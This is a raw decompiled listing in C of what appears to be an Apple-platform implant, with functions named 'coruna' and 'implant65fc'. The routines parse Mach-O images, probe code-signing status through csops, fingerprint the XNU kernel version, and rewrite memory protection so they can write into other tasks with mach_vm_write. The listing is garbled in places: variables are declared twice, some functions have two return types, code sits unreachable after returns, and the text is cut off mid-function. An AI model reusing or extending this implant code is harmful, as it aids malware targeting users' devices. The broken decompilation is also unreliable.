  else if (((*handle != 0) && (*(long *)(*handle + 0x28) != 0)) && (handle[1] != 0)) {
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    lp1 = _getpid();
    err = _csops(lp1,5,&scratch,0x14);
    if (err < 0) {
      u = 0xad00b;
    }
    else {
      u = (**(void (**)(*handle + 0x28))(*handle,handle[1],0x40000105,&scratch);
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_macho_text_seg_12c74(long handle,long addr_2)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0x14002;
  size = *(unsigned long *)(addr_2 + 0x20);
  if (!CARRY8(*(unsigned long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18),size)) {
    if ((*(long *)(addr_2 + 0x28) == 0) && (*(long *)(addr_2 + 0x30) != 0)) {
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      if (*(long *)(handle + 0x18) == 0) {
        u = 0;
        *(uint64_t *)(handle + 0x18) = *(uint64_t *)(addr_2 + 0x18);
      }
      else {
        u = 0x14003;
      }
    }
    else {
      u = 0;
    }
    err = _strcmp((char *)(addr_2 + 8),"__TEXT");
    if (err == 0) {
      *(long *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = addr_2;
    }
    if (size < 0xffffffff) {
      handle = *(long *)(*(long *)(handle + 0x20) + 8);
      *(unsigned long *)(handle + 0x18) = *(long *)(handle + 0x18) + size;
    }
  }
  return u;
}





uint64_t coruna_dlopen(uint64_t val,char *path,uint64_t id_2,long *handle)
{
  int err;
  long handle;
  uint64_t u;
  
  u = 0x1200b;
  if ((path != (char *)0x0) && (handle != (long *)0x0)) {
    handle = _dlopen(path,id_2);
    if (handle == 0) {
      err = _strncmp(path,"@rpath",6);
      if (err != 0) {
        return 0x17004;
      }
      handle = _dlopen(path + 6,id_2);
      if (handle == 0) {
        return 0x17004;
      }
    }
    u = 0;
    *handle = handle;
  }
  return u;
}





uint64_t coruna_dlclose(uint64_t val,long handle)
{
  if (handle != 0) {
    _dlclose(handle);
    return 0;
  }
  return 0x1200c;
}





uint64_t coruna_dlclose_12dcc(uint64_t val,uint64_t id_2)
{
  _dlclose(id_2);
  return 0;
}





uint64_t coruna_implant65fc_residual_116(long handle,long addr_2)
{
  void (*ptr)(void);
  uint64_t u;
  long *ptr;
  long handle;
  void (*buf)(void);
  uint64_t scratch;
  uint32_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t serial_buf;
  
  ptr = *(long **)(handle + 0x20);
  ptr = (void (*)(ptr[3] + *(long *)(addr_2 + 8));
  buf = (void (*)ptr[1];
  if ((ptr >= buf && ptr <= buf + ptr[2]) &&
      (ptr < buf || buf + ptr[2] != ptr)) {
    handle = *ptr;
    bootargs = *(uint32_t **)(handle + 0xd0);
    scratch = *(uint64_t *)(handle + 200);
    serial_buf = *(uint64_t *)(handle + 0xe8);
    host_info = *(uint64_t **)(handle + 0xe0);
    thread_attr = *(uint64_t **)(handle + 0xd8);
    (*ptr)(*bootargs,*thread_attr,*host_info,0,&scratch);
    u = 0;
  }
  else {
    u = 0x12008;
  }
  return u;
}





uint64_t coruna_return_zero_12e78(long handle,long addr_2)
{
  bool err;
  unsigned long u;
  void (*ptr)(void);
  void (*buf)(void);
  unsigned long size;
  long *ptr;
  long handle;
  long addr;
  long off;
  unsigned long version;
  unsigned long port;
  uint64_t scratch;
  uint32_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t serial_buf;
  unsigned long tag;
  
  u = addr_2 + 0x48;
  version = u + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (version <= u) {
      return 0;
    }
    if (*(char *)(u + 0x40) == '\x16') {
      size = *(unsigned long *)(u + 0x28);
      if (3 < size) {
        addr = *(long *)(u + 0x20);
        off = *(long *)(handle + 0x20);
        tag = 0;
        port = 1;
        do {
          ptr = *(long **)(handle + 0x28);
          ptr = (void (*)ptr[1];
          buf = ptr + *(uint *)(off + addr + tag * 4);
          if (buf < ptr || ptr + ptr[2] <= buf) {
            return 0x12008;
          }
          handle = *ptr;
          bootargs = *(uint32_t **)(handle + 0xd0);
          scratch = *(uint64_t *)(handle + 200);
          serial_buf = *(uint64_t *)(handle + 0xe8);
          host_info = *(uint64_t **)(handle + 0xe0);
          thread_attr = *(uint64_t **)(handle + 0xd8);
          (*buf)(*bootargs,*thread_attr,*host_info,0,&scratch);
          err = port < size >> 2;
          tag = port;
          port = (unsigned long)((int)port + 1);
        } while (err);
      }
    }
    else if ((*(char *)(u + 0x40) == '\t') && (size = *(unsigned long *)(u + 0x28), 7 < size)) {
      addr = *(long *)(u + 0x20);
      off = *(long *)(handle + 0x20);
      tag = 0;
      port = 1;
      do {
        buf = *(void (**)(off + addr + tag * 8);
        ptr = *(long **)(handle + 0x28);
        if (buf < (void (*)ptr[1] || (void (*)ptr[1] + ptr[2] <= buf) {
          return 0x12008;
        }
        handle = *ptr;
        bootargs = *(uint32_t **)(handle + 0xd0);
        scratch = *(uint64_t *)(handle + 200);
        serial_buf = *(uint64_t *)(handle + 0xe8);
        host_info = *(uint64_t **)(handle + 0xe0);
        thread_attr = *(uint64_t **)(handle + 0xd8);
        (*buf)(*bootargs,*thread_attr,*host_info,0,&scratch);
        err = port < size >> 3;
        tag = port;
        port = (unsigned long)((int)port + 1);
      } while (err);
    }
    u = u + 0x50;
  } while( true );
}





void coruna_macho_pagezero_1300c(long handle,long addr_2)
{
  int err;
  uint64_t *ptr;
  uint8_t scratch;
  
  err = _strncmp((char *)(addr_2 + 8),"__PAGEZERO",0xb);
  if (err != 0) {
    ptr = *(uint64_t **)(handle + 0x20);
    scratch = 0;
    coruna_implant65fc_via_implant65fc_via_mach_vm_region_recurse(*ptr,*(uint32_t *)(ptr + 0xb),ptr[10] + *(long *)(addr_2 + 0x18),
                 *(uint64_t *)(addr_2 + 0x20),&scratch);
  }
  return;
}





uint64_t coruna_implant65fc_via_strdup_4(long handle,unsigned long *arg)
{
  unsigned long u;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint64_t scratch;
  
  version = 0xad001;
  if ((((handle != 0) && (arg != (unsigned long *)0x0)) && (arg[1] != 0)) &&
     (port = *arg, port != 0)) {
    version = 0x910007;
    if ((byte)arg[4] - 1 < 3) {
      size = *(unsigned long *)(handle + 0x40);
      u = *(long *)(handle + 0x48) + size;
      if ((((size <= u) && (size <= port)) &&
          ((port < u && ((port < 0xfffffffffffffff8 && (size <= port + 8)))))) &&
         (port + 8 <= u)) {
        scratch = 0;
        version = coruna_implant65fc_residual_119(*(uint64_t *)(handle + 0x98),*(uint32_t *)(handle + 0xa0),
                             *(uint32_t *)((long)arg + 0x24),&scratch);
        if ((int)version == 0) {
          version = coruna_strdup_4(scratch,arg);
        }
      }
    }
    else {
      version = 0x91000e;
    }
  }
  return version;
}





uint64_t coruna_implant65fc_residual_117(long handle,uint64_t *val,int *flags)
{
  void *ptr;
  unsigned long u;
  uint64_t *ptr;
  char *ptr;
  uint64_t size;
  unsigned long version;
  
  size = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (flags != (int *)0x0)) {
    version = (unsigned long)*(uint *)(handle + 0xa0);
    if (*(uint *)(handle + 0xa0) == 0) {
      size = 0;
      *val = 0;
      *flags = 0;
    }
    else {
      ptr = _calloc(version,8);
      if (ptr == (void *)0x0) {
        size = 0xad009;
      }
      else {
        u = 0;
        ptr = (uint64_t *)(*(long *)(handle + 0x98) + 8);
        do {
          ptr = (char *)ptr[-1];
          if ((ptr == (char *)0x0) || ((uint64_t *)*ptr != &k_implant_rodata_word_204c8)) {
            size = 0x910014;
            goto fail;
          }
          if ((*ptr == '\0') || (*(long *)(ptr + 0x10) != 0)) {
            *(char **)((long)ptr + u * 8) = ptr;
            u = (unsigned long)((int)u + 1);
          }
          ptr = ptr + 2;
          version = version - 1;
        } while (version != 0);
        size = 0;
        if ((int)u == 0) {
          *val = 0;
          *flags = 0;
fail:
          _free(ptr);
        }
        else {
          *val = ptr;
          *flags = (int)u;
        }
      }
    }
  }
  return size;
}





uint8_t * coruna_implant65fc_via_mach_port_deallocate_1c3fc(uint64_t *val,long handle,long addr_2,uint size,unsigned long arg)
{
  long handle;
  uint8_t *ptr;
  long scratch [3];
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  long thread_attr;
  uint64_t thread_attr;
  unsigned long host_info;
  uint64_t host_info;
  
  ptr = (uint8_t *)0xad001;
  if ((val != (uint64_t *)0x0) && ((addr_2 != 0 || (size == 0)))) {
    if (handle == 0) {
      ptr = &k_implant_rodata_word_1e010;
    }
    else {
      scratch[0] = 0;
      ptr = (uint8_t *)coruna_mach_vm_allocate(*(uint32_t *)(val + 0xb),0x80000,0x1e000001,scratch)
      ;
      handle = scratch[0];
      if ((int)ptr == 0) {
        scratch[1] = 0;
        scratch = (unsigned long)size;
        bootargs = val[9];
        bootargs = val[8];
        thread_attr = scratch[0];
        thread_attr = 0x80000;
        host_info = arg & 0xffffffff;
        host_info = 0;
        scratch[0] = handle;
        scratch[2] = addr_2;
        ptr = (uint8_t *)
                 coruna_mach_port_deallocate_1c3fc(*(uint64_t *)*val,((uint64_t *)*val)[1],
                              *(uint32_t *)(val + 0xb),*(uint8_t *)(val + 0x12),
                              scratch,handle,0x80000);
        if ((int)ptr != 0) {
          coruna_mach_vm_deallocate_1b998(*(uint32_t *)(val + 0xb),handle,0x80000,0);
        }
      }
    }
  }
  return ptr;
}





uint64_t coruna_implant65fc_residual_118(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_implant65fc_residual_120();
    return u;
  }
  return 0xad001;
}





uint64_t
void coruna_implant65fc_via_ctx_free_11dc8_3(long handle,uint64_t val,long addr_2,uint64_t id_2,byte arg,
            long *off_3)
{
  unsigned long u;
  unsigned long size;
  long handle;
  unsigned long version;
  uint64_t port;
  
  port = 0xad001;
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) &&
     (((addr_2 != 0 && ((int)id_2 != 0)) && (off_3 != (long *)0x0)))) {
    handle = coruna_macho_open_image(addr_2,id_2,handle,val,1);
    if (handle == 0) {
      port = 0x12002;
    }
    else {
      version = 0;
      *(byte *)(handle + 0x110) = arg & 1;
      *(bool *)(handle + 0x130) = (arg & 5) != 0;
      *(uint16_t *)(handle + 0x1c3) = 0;
      size = 0x10;
      if ((arg & 4) == 0) {
        size = 0x11;
      }
      do {
        u = version + 1;
        port = (*(void (*)(&k_implant_rodata_word_20378)[version])(handle);
        version = u;
      } while ((int)port == 0 && u < size);
      if ((int)port == 0) {
        *off_3 = handle;
      }
      else {
        coruna_ctx_free_11dc8(handle);
      }
    }
  }
  return port;
}





uint64_t coruna_implant65fc_via_sysctlnametomib(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_vm_read_overwrite_1bb8c(*(uint32_t *)(handle + 0x20),handle + 0x30,handle + 0x38);
    if ((((int)u == 0) &&
        (u = coruna_mach_vm_read_overwrite_1bb8c(*(uint32_t *)(handle + 0x58),handle + 0x68,handle + 0x70),
        (int)u == 0)) &&
       (u = coruna_sysctlnametomib(*(uint32_t *)(handle + 0x20),handle + 0x24,handle + 0x28),
       (int)u == 0)) {
      u = coruna_sysctlnametomib(*(uint32_t *)(handle + 0x58),handle + 0x5c,handle + 0x60);
      return u;
    }
  }
  return u;
}





void coruna_nop_stub(uint64_t val)
{
  coruna_block_dispose_13760(val,1);
  return;
}





uint64_t coruna_implant65fc_via_implant65fc_via_macho_foreach_loadcmd_5(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_implant65fc_via_macho_foreach_loadcmd_6(handle,&k_implant_nsconcreteglobalblock_slot);
    if ((int)u == 0) {
      u = coruna_implant65fc_via_macho_foreach_loadcmd_5(handle,&k_implant_nsconcreteglobalblock_slot);
      return u;
    }
  }
  return u;
}





uint32_t coruna_mach_vm_protect_13514(long handle)
{
  kern_return_t lk1;
  uint32_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = 0x910016;
    if (((*(mach_vm_address_t *)(handle + 8) != 0) && (*(long *)(handle + 0x40) != 0)) &&
       (*(mach_vm_size_t *)(handle + 0x10) == *(mach_vm_size_t *)(handle + 0x48))) {
      lk1 = _mach_vm_protect(*(vm_map_t *)k_implant_mach_task_self_slot,
                               *(mach_vm_address_t *)(handle + 8),
                               *(mach_vm_size_t *)(handle + 0x10),0,3);
      if (lk1 == 0) {
        lk1 = _mach_vm_protect(*(vm_map_t *)(handle + 0x58),
                                 *(mach_vm_address_t *)(handle + 0x40),
                                 *(mach_vm_size_t *)(handle + 0x48),0,3);
        if (lk1 == 0) {
          lk1 = _mach_vm_write(*(vm_map_t *)(handle + 0x58),
                                 *(mach_vm_address_t *)(handle + 0x40),
                                 *(vm_offset_t *)(handle + 8),
                                 *(mach_msg_type_number_t *)(handle + 0x48));
          u = 0;
          if (lk1 != 0) {
            u = 0x1e015;
          }
        }
        else {
          u = 0x1e017;
        }
      }
      else {
        u = 0x1e016;
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_ctx_free_11dc8_4(long handle,uint64_t val,long addr_2,uint64_t id_2)
{
  bool err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0xad001;
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) &&
     ((addr_2 != 0 && ((int)id_2 != 0)))) {
    handle = coruna_macho_open_image(addr_2,id_2,handle,val,1);
    if (handle == 0) {
      u = 0x12002;
    }
    else {
      size = 0;
      do {
        u = (*(void (*)(&k_implant_rodata_word_20400)[size])(handle);
        err = size < 2;
        size = size + 1;
      } while ((int)u == 0 && err);
      coruna_ctx_free_11dc8(handle);
    }
  }
  return u;
}





void coruna_nop_stub_2(uint64_t val)
{
  coruna_block_dispose_13760(val,0);
  return;
}





uint64_t coruna_implant65fc_via_return_zero_6098(long handle,long *addr_2)
{
  int err;
  uint64_t u;
  long handle;
  long addr;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != (long *)0x0)) {
    addr = *addr_2;
    scratch = coruna_identity_6080(addr);
    if ((addr != 0) && (*(char *)(handle + 0x138) != '\0')) {
      if ((*(char *)(handle + 0x38) == '\0') || (*(char *)(handle + 0x70) == '\0')) {
        u = coruna_dladdr_1bd4c(*(uint32_t *)(handle + 0x58),scratch,&scratch);
        if ((int)u != 0) {
          return u;
        }
        addr = *addr_2;
      }
      else if (*(long *)(handle + 0x68) != *(long *)(handle + 0x30)) {
        scratch = (scratch - *(long *)(handle + 0x30)) + *(long *)(handle + 0x68);
      }
    }
    handle = scratch;
    err = coruna_return_zero_6098(addr);
    if (err != 0) {
      handle = coruna_implant65fc_via_pacia(handle,0);
    }
    u = 0;
    *addr_2 = handle;
  }
  return u;
}





uint8_t * coruna_block_dispose_13760(long *handle,unsigned long arg)
{
  uint u;
  uint size;
  uint8_t *ptr;
  long *ptr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint8_t *thread_attr;
  uint64_t host_info;
  void (*serial_buf)(void);
  uint8_t *action;
  uint64_t *block_ctx;
  uint64_t stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint8_t path_buf;
  
  if (handle == (long *)0x0) {
    return (uint8_t *)0xad001;
  }
  ptr = (long *)*handle;
  if (ptr == (long *)0x0) {
    return &k_implant_rodata_word_1e004;
  }
  if ((*(char *)((long)ptr + 0x1d) != '\0') && (*ptr == 0)) {
    return &k_implant_rodata_word_1e004;
  }
  sa_saved = &stack_guard;
  stack_guard = 0;
  sa_new = k_implant_rodata_word_1e8c0;
  path_buf = 0;
  if ((arg & 1) == 0) {
    path_buf = 1;
  }
  else {
    thread_attr = k_implant_nsconcretestackblock_slot;
    host_info = k_implant_rodata_word_1e8c8;
    serial_buf = coruna_wire_export_on_err;
    action = &k_implant_rodata_word_20418;
    block_ctx = sa_saved;
    ptr = (uint8_t *)coruna_macho_foreach_loadcmd(handle,0,&thread_attr);
    __Block_object_dispose(&stack_guard,8);
    return ptr;
    if (*(char *)(sa_saved + 3) == '\0') {
      ptr = (uint8_t *)0x910016;
      __Block_object_dispose(&stack_guard,8);
      return ptr;
    }
  }
  scratch = 0;
  scratch = 0;
  bootargs = 0;
  size = coruna_task_info_1bfa8((int)handle[0xb],&scratch);
  u = 0x1e003;
  if (scratch != '\0') {
    u = 0;
  }
  if (size != 0) {
    u = size;
  }
  ptr = (uint8_t *)(unsigned long)u;
fail:
  __Block_object_dispose(&stack_guard,8);
  return ptr;
}





uint64_t coruna_wire_export_on_err(long handle,int *flags)
{
  int err;
  
  err = *flags;
  if ((err == -0x7fffffde) || (err == 0x22 || err == -0x7fffffcc)) {
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  }
  return 0;
}





void coruna_wire_read_u32_thunk(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_wire_read_u32(id_2,off_4);
  return;
}





uint64_t coruna_wire_read_u32(long handle,uint64_t val)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if (handle != 0) {
    err = *(uint *)(handle + 0xe0) * 8;
    if (*(uint *)(handle + 0xe0) >> 0x1d == 0 && err != -8) {
      ptr = _realloc(*(void **)(handle + 0xd8),(unsigned long)(err + 8));
      if (ptr == (void *)0x0) {
        size = 0xad009;
      }
      else {
        size = 0;
        *(void **)(handle + 0xd8) = ptr;
        u = *(uint *)(handle + 0xe0);
        *(uint64_t *)((long)ptr + (unsigned long)u * 8) = val;
        *(uint *)(handle + 0xe0) = u + 1;
      }
    }
    else {
      size = 0xad01d;
    }
  }
  return size;
}





void coruna_wire_read_u32_thunk_2(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_wire_read_u32(id_2,off_4);
  return;
}





uint64_t coruna_strdup_3(uint64_t val,char *path,uint64_t id_2,uint64_t *size_3)
{
  void *ptr;
  char *ptr;
  uint64_t u;
  
  u = 0x1200b;
  if ((path != (char *)0x0) && (size_3 != (uint64_t *)0x0)) {
    u = 0xad009;
    ptr = _calloc(1,0x58);
    if (ptr != (void *)0x0) {
      *(long *)((long)ptr + 0x50) = (long)ptr + 0x10;
      ptr = _strdup(path);
      *(char **)((long)ptr + 8) = ptr;
      if (ptr == (char *)0x0) {
        _free(ptr);
      }
      else {
        u = 0;
        *size_3 = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_wire_export_free(uint64_t val,long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_wire_export_free(handle);
    return u;
  }
  return 0x1200c;
}





uint64_t coruna_wire_err_imm(void)
{
  return 0x910006;
}





uint64_t coruna_implant65fc_residual_119(long *handle,uint size,int flags,long *addr_2)
{
  uint64_t u;
  uint64_t *ptr;
  long handle;
  
  if (size != 0 && handle == (long *)0x0 || addr_2 == (long *)0x0) {
    return 0xad001;
  }
  u = 0x910014;
  if (flags == 0) {
    return 0x910013;
  }
  if ((flags < 1) || (size < flags + 2U)) {
    if (flags != -1) {
      if (flags != -2) {
        return 0x910015;
      }
      if (size < 2) {
        return 0x910017;
      }
      handle = handle[2];
      if (handle == 0) {
        return u;
      }
      ptr = (uint64_t *)handle[3];
      if (ptr != &k_implant_rodata_word_204c8) {
      return u;
      }
      *addr_2 = handle;
      return 0;
    }
    if (size < 2) {
      return 0x910017;
    }
    if (handle == (long *)0x0) {
      return u;
    }
    handle = *handle;
    if (handle == 0) {
      return u;
    }
  }
  else {
    if (handle == (long *)0x0) {
      return u;
    }
    handle = handle[(long)(flags + 1) * 2];
    if (handle == 0) {
      return u;
    }
    handle = handle + (long)(flags + 1) * 2;
  }
  ptr = (uint64_t *)handle[1];
fail:
  if (ptr != &k_implant_rodata_word_204c8) {
    return u;
  }
  *addr_2 = handle;
  return 0;
}





uint64_t coruna_strdup_4(long handle,uint64_t *val)
{
  int err;
  uint64_t u;
  void *ptr;
  char *ptr;
  char *buf;
  uint64_t *ptr;
  uint64_t size;
  uint64_t version;
  
  u = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) &&
     (ptr = *(uint64_t **)(handle + 0x50), ptr != (uint64_t *)0x0)) {
    buf = (char *)val[1];
    if ((buf != (char *)0x0) && (ptr = _calloc(1,0x40), ptr != (void *)0x0)) {
      u = *val;
      version = val[3];
      size = val[2];
      *(uint64_t *)((long)ptr + 0x10) = val[1];
      *(uint64_t *)((long)ptr + 8) = u;
      *(uint64_t *)((long)ptr + 0x20) = version;
      *(uint64_t *)((long)ptr + 0x18) = size;
      u = val[4];
      *(uint64_t *)((long)ptr + 0x30) = val[5];
      *(uint64_t *)((long)ptr + 0x28) = u;
      *(uint64_t *)((long)ptr + 0x38) = val[6];
      ptr = _strdup(buf);
      *(char **)((long)ptr + 0x10) = ptr;
      if (ptr != (char *)0x0) {
        err = coruna_objc_empty_vtable(buf);
        if (err != 0) {
          *(byte *)((long)ptr + 0x18) = *(byte *)((long)ptr + 0x18) | 1;
        }
        *ptr = ptr;
        *(void **)(handle + 0x50) = ptr;
        return 0;
      }
      _free(ptr);
    }
    u = 0xad009;
  }
  return u;
}





unsigned long coruna_implant65fc_residual_120(long arg)

{
  uint u;
  unsigned long size;
  
  if (arg == 0) {
    size = 0xad001;
  }
  else {
    size = coruna_implant65fc_via_implant65fc_residual_110(arg,0,0xfffffffffffffffb);
    if (((int)size == 0) && (size = coruna_implant65fc_via_implant65fc_residual_110(arg,1,0xfffffffffffffffe), (int)size == 0))
    {
      u = 0;
      if (*(int *)(arg + 0xa0) != 2) {
        u = 0x1e018;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint8_t * coruna_implant65fc_via_implant65fc_residual_110(long handle,int flags,uint64_t val)
{
  uint8_t *ptr;
  uint8_t *buf;
  
  buf = (uint8_t *)0xad001;
  if (handle != 0) {
    if (*(int *)(handle + 0xa0) == flags) {
      ptr = _calloc(1,0x58);
      if (ptr == (uint8_t *)0x0) {
        buf = (uint8_t *)0xad009;
      }
      else {
        *(uint8_t **)(ptr + 0x50) = ptr + 0x10;
        *ptr = 1;
        *(uint64_t *)(ptr + 8) = val;
        buf = (uint8_t *)coruna_implant65fc_residual_110(handle,&k_implant_rodata_word_204c8,ptr);
        if ((int)buf != 0) {
          coruna_wire_export_free(ptr);
        }
      }
    }
    else {
      buf = &k_implant_rodata_word_1e018;
    }
  }
  return buf;
}





uint64_t coruna_wire_export_free(char *path)
{
  uint64_t *ptr;
  uint64_t u;
  void *ptr;
  
  if (path == (char *)0x0) {
    u = 0xad001;
  }
  else {
    if ((*path == '\0') && (*(void **)(path + 8) != (void *)0x0)) {
      _free(*(void **)(path + 8));
    }
    ptr = *(void **)(path + 0x10);
    while (ptr != (void *)0x0) {
      ptr = (void *)*ptr;
      if ((void *)ptr[2] != (void *)0x0) {
        _free((void *)ptr[2]);
      }
      _free(ptr);
      ptr = ptr;
    }
    u = 0;
  }
  return u;
}





uint coruna_parse_xnu_processors_13d28(uint8_t *buf)
{
  natural_t ln1;
  mach_port_t lm2;
  uint u;
  pid_t lp4;
  int err;
  kern_return_t lk6;
  int *err;
  uint *ptr;
  uint *buf;
  char *ptr;
  bool err;
  unsigned long size;
  unsigned long version;
  uint port;
  uint64_t scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  processor_info_array_t serial_buf [64];
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  if (buf == (uint8_t *)0x0) {
    u = 0xad001;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  bootargs = bootargs & 0xffffffff00000000;
  serial_buf[0] = (processor_info_array_t)0x0;
  host_info = host_info & 0xffffffff00000000;
  lm2 = _mach_host_self();
  u = _host_processor_info
                    (lm2,1,(natural_t *)&bootargs,serial_buf,(mach_msg_type_number_t *)&host_info)
  ;
  if (u != 0) {
    u = u | 0x80000000;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  ln1 = (natural_t)bootargs;
  if ((natural_t)bootargs == 0) {
    port = 0;
    u = 0xad014;
  }
  else {
    u = 0;
    port = serial_buf[0][1] & 0xffffff;
  }
  _vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,(vm_address_t)serial_buf[0],
                 (host_info & 0xffffffff) << 2);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
  return u;
  }
  ___stack_chk_fail();
  if (port < 2) {
done:
    u = 0;
    *buf = 0;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  if (k_implant_rodata_word_1e888 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp4 = _getpid();
    err = _csops(lp4,0,serial_buf,4);
    if (err < 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_implant_stack_chk_guard_slot == action) {
      return u;
      }
      ___stack_chk_fail();
    }
    if (((uint)serial_buf[0] >> 7 & 1) != 0) goto done;
  }
  scratch = 0;
  lp4 = _getpid();
  err = _csops(lp4,10,&scratch,8);
  if (err != -1) {
    u = 0;
    *buf = 0;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  err = ___error();
  if (*err != 0x22) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  port = scratch;
  u = (scratch & 0xff00ff00) >> 8 | (scratch & 0xff00ff) << 8;
  version = (unsigned long)(u >> 0x10 | u << 0x10);
  ptr = _malloc(version);
  if (ptr == (uint *)0x0) {
    u = 0xad009;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  lp4 = _getpid();
  err = _csops(lp4,10,ptr,version);
  if (err == 0) {
    u = 0xad001;
    if (port != 0) {
      port = (*ptr & 0xff00ff00) >> 8 | (*ptr & 0xff00ff) << 8;
      port = port >> 0x10 | port << 0x10;
      if (port == 0xfade0c02) {
        u = (ptr[2] & 0xff00ff00) >> 8 | (ptr[2] & 0xff00ff) << 8;
        u = u >> 0x10 | u << 0x10;
        buf = ptr;
cleanup:
        if (0x80 < u >> 10) {
          size = *(unsigned long *)(buf + 0x14) >> 0x38;
          goto check_ok;
        }
        u = 0xad008;
      }
      else if (port == 0xfade0cc0) {
        port = ptr[2];
        if (port != 0) {
          port = (port & 0xff00ff00) >> 8 | (port & 0xff00ff) << 8;
          port = port >> 0x10 | port << 0x10;
          if (port < 2) {
            port = 1;
          }
          size = (unsigned long)port;
          buf = ptr + 4;
          do {
            port = (buf[-1] & 0xff00ff00) >> 8 | (buf[-1] & 0xff00ff) << 8;
            port = port >> 0x10 | port << 0x10;
            if (port - 0x1000 < 5 || port == 0) {
              port = (*buf & 0xff00ff00) >> 8 | (*buf & 0xff00ff) << 8;
              buf = (uint *)((long)ptr + (unsigned long)(port >> 0x10 | port << 0x10));
              if (*buf != 0x20cdefa) goto skip;
              _bzero(ptr,version);
              _free(ptr);
              u = (buf[2] & 0xff00ff00) >> 8 | (buf[2] & 0xff00ff) << 8;
              u = u >> 0x10 | u << 0x10;
              goto cleanup;
            }
            buf = buf + 2;
            size = size - 1;
          } while (size != 0);
        }
        size = 0;
check_ok:
        lm2 = _mach_host_self();
        lk6 = _host_kernel_version(lm2,(char *)serial_buf);
        if (lk6 == 0) {
retry:
          ptr = _strstr((char *)serial_buf,"xnu-");
          if (ptr != (char *)0x0) {
            thread_attr = 0;
            bootargs = 0;
            err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
            if (err == 3) {
              if (((uint)size >> 4 & 1) == 0) {
                err = ((size & 0x40) == 0 || (natural_t)bootargs != 0x1327) ||
                         0xdd < bootargs;
              }
              else {
                err = false;
              }
              *buf = err;
              u = 0;
              _bzero(ptr,version);
              _free(ptr);
            }
          }
        }
        else if (lk6 == 0x35) {
          host_info = k_implant_rodata_word_1e880;
          bootargs = 0x200;
          err = _sysctl((int *)&host_info,2,serial_buf,&bootargs,(void *)0x0,0);
          if (err == 0) goto retry;
        }
        u = 0xad00b;
      }
      else {
skip:
        u = 0xad014;
      }
    }
  }
  else {
    err = ___error();
    err = *err;
    buf = (uint *)___error();
    u = -*buf;
    if (-1 < err) {
      u = *buf;
    }
    u = u | 0x40000000;
  }
next:
  _bzero(ptr,version);
  _free(ptr);
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_vasprintf(uint64_t val,uint64_t id_2,int flags,char *path,va_list arg)
{
  int err;
  uint64_t u;
  char *scratch;
  uint64_t bootargs;
  char thread_attr;
  uint32_t scratch;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  scratch = (char *)0x0;
  err = _vasprintf(&scratch,path,arg);
  if (err == -1 || scratch == (char *)0x0) {
    u = 0xffffffff;
  }
  else {
    if (k_implant_rodata_word_245b0 == '\0' || (k_implant_rodata_word_245b2 & 1) == 0) {
      u = 0xffffffff;
    }
    else {
      bootargs = (uint64_t)0;
      _cStack_31 = coruna_cat(0x737d,SUB81(0,7));
      err = (uint)(flags == 7) << 1;
      if (flags == 6) {
        err = 1;
      }
